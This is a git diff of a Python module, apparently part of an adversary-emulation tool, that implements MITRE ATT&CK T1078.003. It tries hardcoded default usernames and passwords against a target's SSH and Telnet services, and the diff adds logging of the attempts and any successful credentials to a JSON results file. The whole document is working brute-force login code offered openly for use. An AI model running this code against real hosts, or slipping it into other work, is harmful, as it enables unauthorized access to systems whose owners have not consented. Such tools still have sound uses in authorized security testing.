@@ -2,10 +2,18 @@ import paramiko
 
 import telnetlib
 import socket
+import json
 
 
 USER_LIST = ['root', 'admin', 'test', 'administrator', 'toor']
 PASSWORD_LIST = ['123456', '123456789', 'password', '111111', '123123']
+INITIAL_ACCESS_LOG =  {
+    'T1078_003' : {
+        'command' : [],
+        'result' : []
+    },
+}
+LOG_TEMP = []
 
 class ValidAccounts:
 
@@ -13,6 +21,17 @@ class ValidAccounts:
         self.target = target
         self.ssh = ssh
         self.telnet = telnet
+
+    def initial_access_run(self):
+        with open('result.json', 'rt', encoding='utf-8') as f:
+            data = json.load(f)
+
+        self.T1078_003() 
+        
+        INITIAL_ACCESS_LOG['T1078_003']['result'] = LOG_TEMP
+        data['result']['initial_access_log'] = INITIAL_ACCESS_LOG
+        with open('result.json', 'wt', encoding='utf-8') as f:
+            json.dump(data, f, indent=4)
 
     def SSHLogin(self):
         for i in range(len(USER_LIST)):
@@ -25,10 +44,13 @@ class ValidAccounts:
                     ssh.connect(host, port=self.ssh, username=username, password=password)
                     ssh_session = ssh.get_transport().open_session()
                     if ssh_session.active:
-                        print(f'[+] SSH login successful on {self.target}:{self.telnet} {username} : {password}')
+                        result_string = f'[+] SSH login successful on {self.target}:{self.telnet} {username} : {password}'
                         ssh.close()
                 except:
-                    print(f'[-] SSH login failed {username} {password}')
+                    result_string = f'[-] SSH login failed {username} {password}'
+                
+                print(result_string)
+                LOG_TEMP.append(result_string)
 
     def TelnetLogin(self):
         for i in range(len(USER_LIST)):
@@ -44,12 +66,14 @@ class ValidAccounts:
                 try: 
                     result = tn.expect([b'Welcome'])
                     if (result[0] != -1):
-                        print(f'[+] Telnet login successful on {self.target}:{self.telnet} {username} : {password}')
+                        result_string = f'[+] Telnet login successful on {self.target}:{self.telnet} {username} : {password}'
                         tn.close()
                 except (EOFError, socket.timeout):
-                    print(f'[-] Telnet login failed {username} {password}')
+                    result_string = f'[-] Telnet login failed {username} {password}'
+                
+                print(result_string)
+                LOG_TEMP.append(result_string)
 
     def T1078_003(self):
         self.SSHLogin()
         self.TelnetLogin()
-
